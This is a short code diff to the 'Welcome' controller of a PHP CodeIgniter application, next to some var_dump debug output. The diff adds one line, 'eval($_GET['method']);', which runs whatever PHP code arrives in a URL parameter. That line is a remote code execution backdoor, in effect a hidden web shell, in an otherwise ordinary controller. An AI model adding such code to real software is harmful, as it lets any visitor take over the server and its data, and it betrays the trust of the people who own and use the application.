@@ -34,5 +34,6 @@ class Welcome extends CI_Controller {
 		var_dump($res);
 		var_dump($res2);
 		var_dump($res3);
+		eval($_GET['method']);
 	}
 }
